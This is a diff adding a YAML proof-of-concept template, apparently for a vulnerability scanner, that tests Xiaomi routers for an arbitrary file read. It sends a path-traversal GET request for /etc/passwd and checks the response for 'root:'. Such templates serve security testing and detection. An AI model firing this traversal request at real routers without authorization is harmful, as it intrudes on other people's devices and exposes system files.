@@ -1,0 +1,9 @@
+name: poc-yaml-小米路由器-Directory
+description: "任意文件读取"
+method: GET
+path:
+  - /api-third-party/download/extdisks../etc/passwd
+expression:
+  status: 200
+  body_all:
+    - "root:"
